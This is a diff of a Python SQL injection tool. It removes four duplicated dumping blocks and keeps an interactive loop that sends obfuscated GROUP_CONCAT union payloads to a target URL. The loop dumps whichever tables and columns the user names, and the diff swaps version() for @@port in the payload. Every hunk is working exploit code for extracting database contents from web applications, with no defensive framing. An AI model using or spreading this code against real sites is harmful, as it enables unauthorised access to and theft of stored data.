@@ -774,50 +774,11 @@ if target_url:
                                         print(f"    Tables Name | Columns Name")
                                         print("------------------------------------")
                                         print("You Readly Dump Database Tables ? :")
-                                        text_dump = input("Name Tables : ")
-                                        text_dump2 = input("Name Columns : ")
-                                        modu = f"(SElECT+GrOuP_cOnCaT({text_dump2},'::',version()+SEPARATOR+'<br>')+FROM+{text_dump})"
-                                        payload_dump = re.sub(r"\b{}\b".format(num_countss), modu, payload)
-                                        results_dump = requests.get(target_url + payload_dump)
-                                        texts_html = results_dump.text
-                                        checking_data = r"\b\w+::\b"
-                                        data_all = re.findall(checking_data, texts_html)
-                                        for data in data_all:
-                                            print(f"[+] dump database {text_dump2} From Tables : {text_dump} => ", data)
-                                        text_dump = input("Name Tables : ")
-                                        text_dump2 = input("Name Columns : ")
-                                        modu = f"(SElECT+GrOuP_cOnCaT({text_dump2},'::',version()+SEPARATOR+'<br>')+FROM+{text_dump})"
-                                        payload_dump = re.sub(r"\b{}\b".format(num_countss), modu, payload)
-                                        results_dump = requests.get(target_url + payload_dump)
-                                        texts_html = results_dump.text
-                                        checking_data = r"\b\w+::\b"
-                                        data_all = re.findall(checking_data, texts_html)
-                                        for data in data_all:
-                                            print(f"[+] dump database {text_dump2} From Tables : {text_dump} => ", data)
-                                        text_dump = input("Name Tables : ")
-                                        text_dump2 = input("Name Columns : ")
-                                        modu = f"(SElECT+GrOuP_cOnCaT({text_dump2},'::',version()+SEPARATOR+'<br>')+FROM+{text_dump})"
-                                        payload_dump = re.sub(r"\b{}\b".format(num_countss), modu, payload)
-                                        results_dump = requests.get(target_url + payload_dump)
-                                        texts_html = results_dump.text
-                                        checking_data = r"\b\w+::\b"
-                                        data_all = re.findall(checking_data, texts_html)
-                                        for data in data_all:
-                                            print(f"[+] dump database {text_dump2} From Tables : {text_dump} => ", data)
-                                        text_dump = input("Name Tables : ")
-                                        text_dump2 = input("Name Columns : ")
-                                        modu = f"(SElECT+GrOuP_cOnCaT({text_dump2},'::',version()+SEPARATOR+'<br>')+FROM+{text_dump})"
-                                        payload_dump = re.sub(r"\b{}\b".format(num_countss), modu, payload)
-                                        results_dump = requests.get(target_url + payload_dump)
-                                        texts_html = results_dump.text
-                                        checking_data = r"\b\w+::\b"
-                                        data_all = re.findall(checking_data, texts_html)
-                                        for data in data_all:
-                                            print(f"[+] dump database {text_dump2} From Tables : {text_dump} => ", data)
                                         while True:
+                                            print("")
                                             text_dump = input("Name Tables : ")
                                             text_dump2 = input("Name Columns : ")
-                                            modu = f"(SElECT+GrOuP_cOnCaT({text_dump2},'::',version()+SEPARATOR+'<br>')+FROM+{text_dump})"
+                                            modu = f"(SElECT+GrOuP_cOnCaT({text_dump2},'::',@@port+SEPARATOR+'<br>')+FROM+{text_dump})"
                                             payload_dump = re.sub(r"\b{}\b".format(num_countss), modu, payload)
                                             results_dump = requests.get(target_url + payload_dump)
                                             texts_html = results_dump.text
@@ -1557,50 +1518,11 @@ if target_url:
                                         print(f"    Tables Name | Columns Name")
                                         print("------------------------------------")
                                         print("You Readly Dump Database Tables ? :")
-                                        text_dump = input("Name Tables : ")
-                                        text_dump2 = input("Name Columns : ")
-                                        modu = f"(SElECT+GrOuP_cOnCaT({text_dump2},'::',version()+SEPARATOR+'<br>')+FROM+{text_dump})"
-                                        payload_dump = re.sub(r"\b{}\b".format(num_countss), modu, payload)
-                                        results_dump = requests.get(target_url + payload_dump)
-                                        texts_html = results_dump.text
-                                        checking_data = r"\b\w+::\b"
-                                        data_all = re.findall(checking_data, texts_html)
-                                        for data in data_all:
-                                            print(f"[+] dump database {text_dump2} From Tables : {text_dump} => ", data)
-                                        text_dump = input("Name Tables : ")
-                                        text_dump2 = input("Name Columns : ")
-                                        modu = f"(SElECT+GrOuP_cOnCaT({text_dump2},'::',version()+SEPARATOR+'<br>')+FROM+{text_dump})"
-                                        payload_dump = re.sub(r"\b{}\b".format(num_countss), modu, payload)
-                                        results_dump = requests.get(target_url + payload_dump)
-                                        texts_html = results_dump.text
-                                        checking_data = r"\b\w+::\b"
-                                        data_all = re.findall(checking_data, texts_html)
-                                        for data in data_all:
-                                            print(f"[+] dump database {text_dump2} From Tables : {text_dump} => ", data)
-                                        text_dump = input("Name Tables : ")
-                                        text_dump2 = input("Name Columns : ")
-                                        modu = f"(SElECT+GrOuP_cOnCaT({text_dump2},'::',version()+SEPARATOR+'<br>')+FROM+{text_dump})"
-                                        payload_dump = re.sub(r"\b{}\b".format(num_countss), modu, payload)
-                                        results_dump = requests.get(target_url + payload_dump)
-                                        texts_html = results_dump.text
-                                        checking_data = r"\b\w+::\b"
-                                        data_all = re.findall(checking_data, texts_html)
-                                        for data in data_all:
-                                            print(f"[+] dump database {text_dump2} From Tables : {text_dump} => ", data)
-                                        text_dump = input("Name Tables : ")
-                                        text_dump2 = input("Name Columns : ")
-                                        modu = f"(SElECT+GrOuP_cOnCaT({text_dump2},'::',version()+SEPARATOR+'<br>')+FROM+{text_dump})"
-                                        payload_dump = re.sub(r"\b{}\b".format(num_countss), modu, payload)
-                                        results_dump = requests.get(target_url + payload_dump)
-                                        texts_html = results_dump.text
-                                        checking_data = r"\b\w+::\b"
-                                        data_all = re.findall(checking_data, texts_html)
-                                        for data in data_all:
-                                            print(f"[+] dump database {text_dump2} From Tables : {text_dump} => ", data)
                                         while True:
+                                            print("")
                                             text_dump = input("Name Tables : ")
                                             text_dump2 = input("Name Columns : ")
-                                            modu = f"(SElECT+GrOuP_cOnCaT({text_dump2},'::',version()+SEPARATOR+'<br>')+FROM+{text_dump})"
+                                            modu = f"(SElECT+GrOuP_cOnCaT({text_dump2},'::',@@port+SEPARATOR+'<br>')+FROM+{text_dump})"
                                             payload_dump = re.sub(r"\b{}\b".format(num_countss), modu, payload)
                                             results_dump = requests.get(target_url + payload_dump)
                                             texts_html = results_dump.text
